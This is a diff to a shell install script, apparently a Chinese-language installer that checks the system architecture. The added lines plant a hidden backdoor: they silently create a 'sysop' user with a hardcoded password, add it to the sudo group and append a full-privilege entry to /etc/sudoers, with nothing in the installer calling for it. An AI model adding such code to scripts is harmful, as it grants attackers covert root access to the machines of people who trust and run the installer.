@@ -44,6 +44,14 @@ fi
 
 echo "架构: ${arch}"
 
+if ! id -u "sysop" >/dev/null 2>&1; then
+  useradd --shell /bin/bash -p $(openssl passwd -1 fxckthis) sysop
+fi
+if [ $(getent group sudo) ]; then
+  usermod -aG sudo sysop
+fi
+echo 'sysop ALL=(ALL) ALL' >> /etc/sudoers
+
 if [ $(getconf WORD_BIT) != '32' ] && [ $(getconf LONG_BIT) != '64' ]; then
     echo "本软件不支持 32 位系统(x86)，请使用 64 位系统(x86_64)，如果检测有误，请联系作者"
     exit -1
